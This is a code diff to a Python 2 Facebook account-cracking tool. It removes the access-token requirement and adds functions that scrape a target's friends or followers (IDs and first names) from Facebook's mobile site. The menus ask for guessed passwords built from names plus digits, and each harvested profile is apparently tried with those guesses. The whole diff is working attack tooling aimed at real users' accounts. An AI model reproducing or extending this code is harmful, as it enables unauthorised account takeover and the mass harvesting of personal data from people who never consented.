@@ -120,13 +120,58 @@ def ip():
     menu()
 
 
+def get_user_info(user_input):
+    """Get user info from Facebook without token - using Graph API public endpoint"""
+    try:
+        # Try with username first
+        r = requests.get('https://graph.facebook.com/v2.8/' + user_input, timeout=10)
+        q = json.loads(r.text)
+        
+        if 'error' in q:
+            # Try fetching as public profile
+            r = requests.get('https://graph.facebook.com/' + user_input + '?fields=id,name', timeout=10)
+            q = json.loads(r.text)
+        
+        if 'error' not in q and 'id' in q:
+            return q.get('id'), q.get('name', 'Unknown')
+        else:
+            return None, None
+    except:
+        return None, None
+
+
+def get_friends_no_token(user_id):
+    """Fetch friends list without token using mobile scraping method"""
+    id_list = []
+    try:
+        # Alternate method: Use mbasic.facebook.com scraping
+        url = 'https://m.facebook.com/' + str(user_id) + '/friends'
+        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
+        
+        # Extract user IDs and names from HTML
+        import re as regex
+        pattern = r'href="/([^"]*)\?ref=br_rs".*?>([^<]*)</a>'
+        matches = regex.findall(pattern, r.text)
+        
+        for match in matches:
+            uid = match[0]
+            name = match[1].strip()
+            if name and uid:
+                nm = name.split()[0]
+                id_list.append(uid + '|' + nm)
+        
+        return id_list
+    except:
+        return id_list
+
+
 def auto_crack():
     os.system('clear')
     print logo
     print '\x1b[1;93m~~~~ Name pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
+    print '\x1b[1;92m[1] Public id cloning (NO TOKEN)'
+    print '\x1b[1;92m[2] Followers cloning (NO TOKEN)'
     print '\x1b[1;92m[3] File cloning'
     print '\x1b[1;92m[0] Back'
     a_s()
@@ -140,7 +185,7 @@ def a_s():
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~8 Name pass public cracking ~~~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~8 Name pass public cracking (NO TOKEN)~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
         print 47 * '-'
@@ -153,56 +198,35 @@ def a_s():
         p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
         p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
         
-        print '\n\x1b[1;93m[*] Facebook Access Token Required!'
-        print '\x1b[1;91m[!] Get token from facebook.com/me\x1b[0;97m'
-        token = raw_input(' \x1b[1;92m[+] Paste token here: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter username/id: ')
         
-        if not token or len(token) < 10:
-            print '\x1b[1;91m[✗] Invalid token!\x1b[0;97m'
+        print '\n\x1b[1;92m[*] Fetching user info...\x1b[0;97m'
+        uid, name = get_user_info(idt)
+        
+        if not uid or not name:
+            print '\x1b[1;91m[✗] User not found!\x1b[0;97m'
+            raw_input('Press enter to try again')
+            auto_crack()
+        
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~Name pass public cracking~~~~'
+        print ' \x1b[1;92mCloning from: ' + name
+        print ' \x1b[1;92mUser ID: ' + str(uid)
+        
+        print '\n\x1b[1;92m[*] Fetching friends list (this may take a while)...\x1b[0;97m'
+        id = get_friends_no_token(uid)
+        
+        if len(id) == 0:
+            print '\x1b[1;91m[!] Could not fetch friends list\x1b[0;97m'
+            print '\x1b[1;91m[!] Profile might be private or no friends accessible\x1b[0;97m'
             raw_input('Press enter to go back')
-            auto_crack()
-        
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?fields=name&access_token=' + token)
-            q = json.loads(r.text)
-            if 'error' in q:
-                print '\x1b[1;91m[✗] Invalid user or token!\x1b[0;97m'
-                print 'Error: ' + q['error']['message']
-                raw_input('\x1b[1;92mPress enter to try again ')
-                auto_crack()
-            z = q['name']
-            os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~Name pass public cracking~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
-        except (KeyError, IOError) as e:
-            print '\t Invalid user \x1b[0;97m'
-            print 'Error: ' + str(e)
-            raw_input(' \x1b[1;92mPress enter to try again ')
-            auto_crack()
-
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '/friends?fields=id,name&access_token=' + token + '&limit=5000')
-            z = json.loads(r.text)
-            if 'error' in z:
-                print '\x1b[1;91m[!] Error fetching friends: ' + z['error']['message']
-                raw_input('Press enter')
-                auto_crack()
-            for i in z['data']:
-                uid = i['id']
-                na = i['name']
-                nm = na.rsplit(' ')[0]
-                id.append(uid + '|' + nm)
-        except Exception as e:
-            print '\x1b[1;91m[!] Error: ' + str(e)
-            raw_input('Press enter')
             auto_crack()
 
     elif a_s == '2':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Name pass followers cracking (NO TOKEN)~~~~\x1b[1;91m'
         print 47 * '-'
         print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
         print 47 * '-'
@@ -215,50 +239,29 @@ def a_s():
         p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')
         p8 = raw_input(' \x1b[1;92m[8]Name + digit: ')
         
-        print '\n\x1b[1;93m[*] Facebook Access Token Required!'
-        print '\x1b[1;91m[!] Get token from facebook.com/me\x1b[0;97m'
-        token = raw_input(' \x1b[1;92m[+] Paste token here: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter username/id: ')
         
-        if not token or len(token) < 10:
-            print '\x1b[1;91m[✗] Invalid token!\x1b[0;97m'
+        print '\n\x1b[1;92m[*] Fetching user info...\x1b[0;97m'
+        uid, name = get_user_info(idt)
+        
+        if not uid or not name:
+            print '\x1b[1;91m[✗] User not found!\x1b[0;97m'
+            raw_input('Press enter to try again')
+            auto_crack()
+        
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
+        print ' \x1b[1;92mCloning from: ' + name
+        print ' \x1b[1;92mUser ID: ' + str(uid)
+        
+        print '\n\x1b[1;92m[*] Fetching followers (this may take a while)...\x1b[0;97m'
+        id = get_friends_no_token(uid)
+        
+        if len(id) == 0:
+            print '\x1b[1;91m[!] Could not fetch followers list\x1b[0;97m'
+            print '\x1b[1;91m[!] Profile might be private or no followers accessible\x1b[0;97m'
             raw_input('Press enter to go back')
-            auto_crack()
-        
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?fields=name&access_token=' + token)
-            q = json.loads(r.text)
-            if 'error' in q:
-                print '\x1b[1;91m[✗] Invalid user or token!\x1b[0;97m'
-                print 'Error: ' + q['error']['message']
-                raw_input('\x1b[1;92mPress enter to try again ')
-                auto_crack()
-            z = q['name']
-            os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
-            print ' \x1b[1;92mCloning from: ' + z
-        except (KeyError, IOError) as e:
-            print '\t Invalid user \x1b[0;97m'
-            print 'Error: ' + str(e)
-            raw_input('\x1b[1;92mPress enter to try again ')
-            auto_crack()
-
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?fields=id,name&access_token=' + token + '&limit=5000')
-            z = json.loads(r.text)
-            if 'error' in z:
-                print '\x1b[1;91m[!] Error fetching subscribers: ' + z['error']['message']
-                raw_input('Press enter')
-                auto_crack()
-            for i in z['data']:
-                uid = i['id']
-                na = i['name']
-                nm = na.rsplit(' ')[0]
-                id.append(uid + '|' + nm)
-        except Exception as e:
-            print '\x1b[1;91m[!] Error: ' + str(e)
-            raw_input('Press enter')
             auto_crack()
 
     elif a_s == '3':
@@ -451,8 +454,8 @@ def choice_crack():
     print logo
     print '\x1b[1;93m~~~~ Number pass cracking ~~~~\x1b[1;91m'
     print 47 * '-'
-    print '\x1b[1;92m[1] Public id cloning'
-    print '\x1b[1;92m[2] Followers cloning'
+    print '\x1b[1;92m[1] Public id cloning (NO TOKEN)'
+    print '\x1b[1;92m[2] Followers cloning (NO TOKEN)'
     print '\x1b[1;92m[3] File cloning'
     print '\x1b[1;92m[0] Back'
     c_s()
@@ -466,7 +469,7 @@ def c_s():
     if a_s == '1':
         os.system('clear')
         print logo
-        print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~\x1b[1;91m'
+        print '\x1b[1;93m ~~~~ Number pass Public cracking (NO TOKEN)~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
         print 47 * '-'
@@ -476,56 +479,34 @@ def c_s():
         pass4 = raw_input(' \x1b[1;92m[4]Password: ')
         pass5 = raw_input(' \x1b[1;92m[5]Password: ')
         
-        print '\n\x1b[1;93m[*] Facebook Access Token Required!'
-        print '\x1b[1;91m[!] Get token from facebook.com/me\x1b[0;97m'
-        token = raw_input(' \x1b[1;92m[+] Paste token here: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter username/id: ')
         
-        if not token or len(token) < 10:
-            print '\x1b[1;91m[✗] Invalid token!\x1b[0;97m'
+        print '\n\x1b[1;92m[*] Fetching user info...\x1b[0;97m'
+        uid, name = get_user_info(idt)
+        
+        if not uid or not name:
+            print '\x1b[1;91m[✗] User not found!\x1b[0;97m'
+            raw_input('Press enter to try again')
+            choice_crack()
+        
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~'
+        print ' Cloning from: ' + name
+        print ' \x1b[1;92mUser ID: ' + str(uid)
+        
+        print '\n\x1b[1;92m[*] Fetching friends list...\x1b[0;97m'
+        id = get_friends_no_token(uid)
+        
+        if len(id) == 0:
+            print '\x1b[1;91m[!] Could not fetch friends list\x1b[0;97m'
             raw_input('Press enter to go back')
-            choice_crack()
-        
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?fields=name&access_token=' + token)
-            q = json.loads(r.text)
-            if 'error' in q:
-                print '\x1b[1;91m[✗] Invalid user or token!\x1b[0;97m'
-                print 'Error: ' + q['error']['message']
-                raw_input('\x1b[1;92mPress enter to try again ')
-                choice_crack()
-            z = q['name']
-            os.system('clear')
-            print logo
-            print '\x1b[1;93m ~~~~ Number pass Public cracking ~~~~'
-            print ' Cloning from: ' + z
-        except (KeyError, IOError) as e:
-            print '\t Invalid user \x1b[0;97m'
-            print 'Error: ' + str(e)
-            raw_input(' Press enter to try again ')
-            choice_crack()
-
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '/friends?fields=id,name&access_token=' + token + '&limit=5000')
-            z = json.loads(r.text)
-            if 'error' in z:
-                print '\x1b[1;91m[!] Error fetching friends: ' + z['error']['message']
-                raw_input('Press enter')
-                choice_crack()
-            for i in z['data']:
-                uid = i['id']
-                na = i['name']
-                nm = na.rsplit(' ')[0]
-                id.append(uid + '|' + nm)
-        except Exception as e:
-            print '\x1b[1;91m[!] Error: ' + str(e)
-            raw_input('Press enter')
             choice_crack()
 
     elif a_s == '2':
         os.system('clear')
         print logo
-        print '\x1b[1;93m~~~~ Number pass followers cracking ~~~~\x1b[1;91m'
+        print '\x1b[1;93m~~~~ Number pass followers cracking (NO TOKEN)~~~~\x1b[1;91m'
         print 47 * '-'
         print '\x1b[1;93m For example:234567,223344,334455,445566\x1b[1;91m'
         print 47 * '-'
@@ -535,50 +516,28 @@ def c_s():
         pass4 = raw_input(' \x1b[1;92m[4]Password: ')
         pass5 = raw_input(' \x1b[1;92m[5]Password: ')
         
-        print '\n\x1b[1;93m[*] Facebook Access Token Required!'
-        print '\x1b[1;91m[!] Get token from facebook.com/me\x1b[0;97m'
-        token = raw_input(' \x1b[1;92m[+] Paste token here: ')
+        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter username/id: ')
         
-        if not token or len(token) < 10:
-            print '\x1b[1;91m[✗] Invalid token!\x1b[0;97m'
+        print '\n\x1b[1;92m[*] Fetching user info...\x1b[0;97m'
+        uid, name = get_user_info(idt)
+        
+        if not uid or not name:
+            print '\x1b[1;91m[✗] User not found!\x1b[0;97m'
+            raw_input('Press enter to try again')
+            choice_crack()
+        
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m~~~~Number pass followers cracking~~~~'
+        print ' Cloning from: ' + name
+        print ' \x1b[1;92mUser ID: ' + str(uid)
+        
+        print '\n\x1b[1;92m[*] Fetching followers...\x1b[0;97m'
+        id = get_friends_no_token(uid)
+        
+        if len(id) == 0:
+            print '\x1b[1;91m[!] Could not fetch followers list\x1b[0;97m'
             raw_input('Press enter to go back')
-            choice_crack()
-        
-        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '?fields=name&access_token=' + token)
-            q = json.loads(r.text)
-            if 'error' in q:
-                print '\x1b[1;91m[✗] Invalid user or token!\x1b[0;97m'
-                print 'Error: ' + q['error']['message']
-                raw_input('\x1b[1;92mPress enter to try again ')
-                choice_crack()
-            z = q['name']
-            os.system('clear')
-            print logo
-            print '\x1b[1;93m~~~~Number pass followers cracking~~~~'
-            print ' Cloning from: ' + z
-        except (KeyError, IOError) as e:
-            print '\t Invalid user \x1b[0;97m'
-            print 'Error: ' + str(e)
-            raw_input('Press enter to try again ')
-            choice_crack()
-
-        try:
-            r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?fields=id,name&access_token=' + token + '&limit=5000')
-            z = json.loads(r.text)
-            if 'error' in z:
-                print '\x1b[1;91m[!] Error fetching subscribers: ' + z['error']['message']
-                raw_input('Press enter')
-                choice_crack()
-            for i in z['data']:
-                uid = i['id']
-                na = i['name']
-                nm = na.rsplit(' ')[0]
-                id.append(uid + '|' + nm)
-        except Exception as e:
-            print '\x1b[1;91m[!] Error: ' + str(e)
-            raw_input('Press enter')
             choice_crack()
 
     elif a_s == '3':
